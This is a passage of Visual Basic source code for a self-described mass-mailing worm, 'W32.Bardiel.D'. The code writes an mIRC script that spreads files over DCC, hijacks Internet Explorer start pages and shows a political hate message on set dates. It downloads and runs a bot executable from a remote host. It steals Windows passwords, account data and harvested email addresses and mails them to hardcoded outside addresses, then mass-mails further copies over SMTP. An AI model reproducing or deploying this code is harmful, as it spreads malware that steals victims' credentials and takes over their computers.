   "  if ( $exists(%bv.file) = $false ) { halt }" & vbCrLf & _
   "  if ( $sock(bv.*,0) > 5 ) { return }" & vbCrLf & _
   "  Set %bv. $+ $1 0 | :scanpt | Set %pt $rand(2400,5000)" & vbCrLf & _
   "  if ( $portfree(%pt) = $false ) { goto scanpt }" & vbCrLf & _
   "  Set [ % $+ [ nv. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%bv.file).size" & vbCrLf & _
   "  Set %bv.vtp1 bv. $+ $1 | .timer $+ $1 1 300 { .sockclose %bv.vtp1 | .sockclose i. $+ $1 }" & vbCrLf & _
   "  .timer $+ $1 1 50 eb $1 | .ignore -u90 $1 2" & vbCrLf & _
   "  .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %bv.file $longip($ip) %pt %sz $+ $chr(1)" & vbCrLf & _
   "if ( $sock(%bv.vtp1) != $null ) { .sockclose %bv.vtp1 } | .socklisten %bv.vtp1 %pt }" & vbCrLf & _
   "Alias eb { if ( [ % $+ [ nv. $+ [ $1 ] ] ] = 0 ) { .sockclose [ i. $+ [ $1 ] ] | .sockclose [ bv. $+ [ $1 ] ] | .timer $+ $1 off } }" & vbCrLf & _
   "Alias lsv { if ( $calc( [ % $+ [ nv. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %bv.file [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data | inc [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ bv. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ nv. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %bv.file [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data } }" & vbCrLf & _
   "On 1:SockClose:i.*:{ Set %bv.tmp6 $remove($sockname,i.) | sockclose $sockname | sockclose [ bv. $+ [ %bv.tmp6 ] ] | .timer $+ %bv.tmp6 off }" & vbCrLf & _
   "On 1:SockListen:bv.*:{ Set %bv.tmp5 $remove($sockname,bv.) | sockaccept i. $+ %bv.tmp5 | lsv %bv.tmp5 }" & vbCrLf & _
   "On 1:SockWrite:i.*:{ Set %bv.tmp6 $remove($sockname,i.) | if ( [ % $+ [ bv. $+ [ %bv.tmp6 ] ] ] = 1 ) { .timer $+ $rand(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ bv. $+ [ %bv.tmp6 ] ] | .timer $+ %bv.tmp6 off | halt } | lsv %bv.tmp6 }" & vbCrLf & _
   "On 1:Disconnect:{ .timers off | .sockclose bv.* | .sockclose i.* }" & vbCrLf & _
   "Alias Sendlogin {" & vbCrLf & _
   "  .Set %smc 1 | .Set %ulg $1-" & vbCrLf & _
   "  .hadd -m sms 1 $decode(SGVsbyB3d3cuaG90bWFpbC5jb20=,m)" & vbCrLf & _
   "  .hadd sms 2 $decode(bWFpbCBmcm9tOjxsb2dpbnVuZGVyQGhvdG1haWwuY29tPg==,m)" & vbCrLf & _
   "  .hadd sms 3 $decode(cmNwdCB0bzo8dW5kZXJsb2dpbkBob3RtYWlsLmNvbT4=,m)" & vbCrLf & _
   "  .hadd sms 4 $decode(ZGF0YQ==,m)" & vbCrLf & _
   "  .sockopen smtp $decode(bXgxLmhvdG1haWwuY29t,m) 25" & vbCrLf

   mi4 = "}" & vbCrLf & _
   "On *:sockread:smtp:{ .sockread %sm" & vbCrLf & _
   "  if $left(%sm,3) == 220 { .sockwrite -tn smtp $hget(sms,%smc) }" & vbCrLf & _
   "  if $left(%sm,3) == 250 { .sockwrite -tn smtp $hget(sms,%smc) }" & vbCrLf & _
   "  if $left(%sm,3) == 354 { .sockwrite -tn smtp $hget(sms,%smc) | .sockwrite -tn smtp %ulg | .sockwrite -tn smtp . }" & vbCrLf & _
   "if $left(%sm,1) == 5 { .sockclose smtp } | .inc %smc }" & vbCrLf & _
   "On *:sockclose:smtp:{ .Set %smc 1 }"

   mis = mi1 & mi2 & mi3 & mi4: mis = Replace(mis, "SYSDIR", Sp(1))

   l = FrFile
   Open Path & jm For Output As #l
   Print #l, mis
   Close #l
   End Sub

   Private Function RName() As String
   'OK
   On Error Resume Next
   For i = 1 To 7
   R = Int(Rnd * 55) + 66
   If R = 92 Then R = 96
   RName = RName & Chr(R)
   Next
   End Function

   Public Function B64(ByVal vsFullPathname)
   'OK
   On Error Resume Next
   Dim b           As Integer: Dim Base64Tab  As Variant
   Dim bin(3)      As Byte: Dim s, sResult As String: Dim l, i, FileIn, n As Long

   Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

   Erase bin: l = 0: i = 0: FileIn = 0: b = 0: s = "": FileIn = FreeFile

   Open vsFullPathname For Binary As FileIn
   sResult = s & vbCrLf: s = "": l = LOF(FileIn) - (LOF(FileIn) Mod 3)
   For i = 1 To l Step 3

   Get FileIn, , bin(0): Get FileIn, , bin(1): Get FileIn, , bin(2)

   If Len(s) > 64 Then
   s = s & vbCrLf: sResult = sResult & s: s = ""
   End If

   b = (bin(n) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): b = bin(n + 2) And &H3F: s = s & Base64Tab(b)
   Next i

   If Not (LOF(FileIn) Mod 3 = 0) Then
   For i = 1 To (LOF(FileIn) Mod 3)
   Get FileIn, , bin(i - 1)
   Next i
   If (LOF(FileIn) Mod 3) = 2 Then
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): s = s & "="
   Else
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): s = s & "=="
   End If
   End If

   If s <> "" Then
   s = s & vbCrLf: sResult = sResult & s
   End If
   s = ""
   Close FileIn: B64 = sResult
   End Function

   Private Sub Pld()
   'OK
   On Error Resume Next
   Dim D As Long

   If Day(Date) = 2 Then
   Dim f As Integer
   Randomize: f = Int(Rnd * 3) + 1
   If f = 1 Then
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://www.gedzac.tk", 2, 1
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://www.gedzac.tk", 3, 1
   ElseIf f = 2 Then
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://mx.groups.yahoo.com/group/fujimoristas/", 2, 1
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://mx.groups.yahoo.com/group/fujimoristas/", 3, 1
   ElseIf f = 3 Then
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://www.fujimorialberto.com", 2, 1
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://www.fujimorialberto.com", 3, 1
   End If
   End If

   D = FrFile

   Open "C:\Bardiel.hta" For Output As #D
   Print #D, "<HTML><body bgcolor=black text=white><center><b><font size=4>Muerte a israel, Muerte a eeuu y a sus aliados serviles<br><p>Libertad a Palestina, Afganistan e Iraq</font></b></center></body></HTML>"
   Close #D

   If Day(Date) = 11 Then Call ShellExecute(Form1.hWnd, vbNullString, "C:\Bardiel.hta", vbNullString, vbNullString, SW_NORMAL)

   If Day(Date) = 4 Then
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://es.geocities.com/mdm3002bd/asesinos.htm", 2, 1
   Rw "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://es.geocities.com/mdm3002bd/asesinos.htm", 3, 1
   Call ShellExecute(Form1.hWnd, vbNullString, "http://es.geocities.com/mdm3002bd/asesinos.htm", vbNullString, vbNullString, SW_NORMAL)
   End If
   End Sub

   Private Sub VerComp()
   'OK
   On Error Resume Next
   Dim b As Boolean
   If Flx(Sp(0) & "\GedBot.exe") Or (Not (iStat)) Then Exit Sub
   b = DF(GetWeb() & "\irc.bin", Sp(0) & "\GedBot.exe")
   If b = True Then Call WinExec(Sp(0) & "\GedBot.exe", SW_NORMAL)
   End Sub

   Private Function DF(URL As String, Path As String) As Boolean
   'OK
   On Error Resume Next: Dim lngRetVal As Long: lngRetVal = URLDownloadToFile(0, URL, Path, 0, 0): DF = IIf(lngRetVal = 0, True, False)
   End Function

   Private Sub Notification()
   'OK
   On Error Resume Next
   Dim vrf As String
   vrf = Rr("SOFTWARE\GedzacLABS\Bardiel.d", "Nof", 3)
   If (iStat() = False) Or (vrf <> "") Then Exit Sub

   Dim msg As String
   msg = "W32.Bardiel.D.worm Reportandose" & vbCrLf & Rr("Software\GedzacLABS\Bardiel.d", "Parent", 3) & vbCrLf & InDat(1) & vbCrLf & InDat(2) & vbCrLf
   msg = msg & vbCrLf & ReadFile(Sp(2) & "\bh.dat") & vbCrLf & ReadFile(Sp(2) & "\bl.dat") & vbCrLf & ReadFile(Sp(2) & "\bm.dat") & vbCrLf
   msg = msg & vbCrLf & GetWinVersion & vbCrLf & Date & vbCrLf & Time & vbCrLf & Left(PaisID, Len(PaisID) - 1) & vbCrLf & Left(LangID, Len(LangID) - 1) & vbCrLf
   msg = msg & vbCrLf & Left(GetComputerNameEx, Len(GetComputerNameEx)) & vbCrLf & Left(GetUser, Len(GetUser) - 1)

   If GetWinVersion = 1 Then Call GetPass: msg = msg & vbCrLf & StrPass

   If Not (StartWinsock()) Then Exit Sub

   Call Hook(Form1.hWnd)

   Dim Temp As Variant: Progress = 0: do_cancel = False

       If mysock <> 0 Then closesocket (mysock): mysock = 0

   Temp = ConnectSock("mx1.latinmail.com", Form1.hWnd, 25, 1, 1025)

       If Temp = INVALID_SOCKET Then GoTo EN

   If Not (bSmtpProgress(1)) Then GoTo EN

   If Not (bSmtpProgress1(220)) Then GoTo EN

      Call SendData(mysock, "HELO www.latinmail.com" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then GoTo EN

       Call SendData(mysock, "mail from:" + Chr(32) + "<wormdarby@latinmail.com>" + vbCrLf)

   If Not (bSmtpProgress1(250)) Then GoTo EN

       Call SendData(mysock, "RCPT TO:<wormdarby@latinmail.com>" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then GoTo EN

       Call SendData(mysock, "DATA" & vbCrLf)

   If Not (bSmtpProgress1(354)) Then GoTo EN

       Call SendData(mysock, msg & vbCrLf & vbCrLf & "." & vbCrLf)

   If Not (bSmtpProgress1(250)) Then GoTo EN

       Call SendData(mysock, "QUIT" & vbCrLf)

   If Not (bSmtpProgress1(221)) Then GoTo EN

   EN:
   Call closesocket(mysock): mysock = 0
   Call UnHook(Form1.hWnd)
   Call EndWinsock

   Rw "SOFTWARE\GedzacLABS\Bardiel.d", "Nof", "Si", 3, 1
   End Sub

   Private Function InDat(n) As String
   'OK
   On Error Resume Next
   Select Case n
   Case 1
   InDat = Rr("Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Server", 2)
   Case 2
   InDat = Rr("Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Email Address", 2)
   End Select
   End Function

   Private Function ReadFile(Path)
   'OK
   On Error Resume Next
   Dim Body As String
   Open Path For Binary Access Read As #20
   Body = Space(LOF(20))
   Get #20, , Body
   Close #20
   ReadFile = Body
   End Function

   Private Sub ExitSmtp()
   'OK
   On Error Resume Next
   Call closesocket(mysock): mysock = 0
   Call UnHook(Form1.hWnd)
   Call EndWinsock
   Call Smtp
   End Sub

   Private Sub Timer4_Timer()
   'OK
   On Error Resume Next
   Timer4.Enabled = False
   Static st As Integer
   If st = 60 Then
   If iStat() Then Call Notification: Call Smtp: st = 0
   Else
   st = st + 1
   End If
   Timer4.Enabled = True
   End Sub

   Private Sub Smtp()
   'OK
   On Error Resume Next
   If (InDat(1) <> "") And (Len(InDat(1)) > 5) And (InStr(InDat(1), ".") <> 0) And (IsMail(InDat(2)) = True) Then
   SendSmtp InDat(1), Sp(2) & "\bm.dat", InDat(2)
   SendSmtp "mx1.latinmail.com", Sp(2) & "\bl.dat", RaMFrom("mdm@latinmail.com")
   SendSmtp "mx1.hotmail.com", Sp(2) & "\bh.dat", RaMFrom("mdm@hotmail.com")
   Else
   SendSmtp "correo.viabcp.com", Sp(2) & "\bm.dat", RaMFrom("mdm@viabcp.com")
   SendSmtp "mx1.latinmail.com", Sp(2) & "\bl.dat", RaMFrom("mdm@latinmail.com")
   SendSmtp "mx1.hotmail.com", Sp(2) & "\bh.dat", RaMFrom("mdm@hotmail.com")
   End If
   End Sub

   Private Function IsMReg(m) As Boolean
   'OK
   On Error Resume Next: Dim m1 As String
   m1 = Rr("Software\GedzacLabs\Bardiel.d\Mail", m, 3)
   If m1 = "" Then
   IsMReg = True
   Rw "Software\GedzacLabs\Bardiel.d\Mail", m, "1Y", 3, 1
   Else
   IsMReg = False
   End If
   End Function

   Private Sub SendSmtp(bHost, bDat, bFrom)
   'OK
   On Error Resume Next
   If iStat() = False Then Exit Sub
   Dim M2 As String, gt As Long, um As String
   um = RaMFrom(bFrom)
   gt = FrFile

   Open bDat For Binary Access Read As #gt
   M2 = Space(LOF(gt))
   Get #gt, , M2
   Close #gt

   M3 = Split(M2, vbCrLf)

   If Not (StartWinsock()) Then Exit Sub
   Call Hook(Form1.hWnd)

   Dim Temp As Variant: Progress = 0: do_cancel = False

       If mysock <> 0 Then closesocket (mysock): mysock = 0

   Temp = ConnectSock(bHost, Form1.hWnd, 25, 1, 1025)

       If Temp = INVALID_SOCKET Then ExitSmtp: Exit Sub

   If Not (bSmtpProgress(1)) Then ExitSmtp: Exit Sub

   If Not (bSmtpProgress1(220)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "HELO www" & Mid(bHost, InStr(bHost, ".")) & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

   For i = 0 To UBound(M3)

   If (IsMail(M3(i))) And (IsMReg(M3(i))) Then

       Call SendData(mysock, "mail from:" + Chr(32) + "<" + um + ">" + vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "RCPT TO:<" & M3(i) & ">" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

      Call SendData(mysock, "DATA" & vbCrLf)

   If Not (bSmtpProgress1(354)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, EML(M3(i), um) & vbCrLf & vbCrLf & "." & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

   End If
   Next

       Call SendData(mysock, "QUIT" & vbCrLf)

   If Not (bSmtpProgress1(221)) Then ExitSmtp: Exit Sub

   Call closesocket(mysock): mysock = 0
   Call UnHook(Form1.hWnd)
   Call EndWinsock
   End Sub
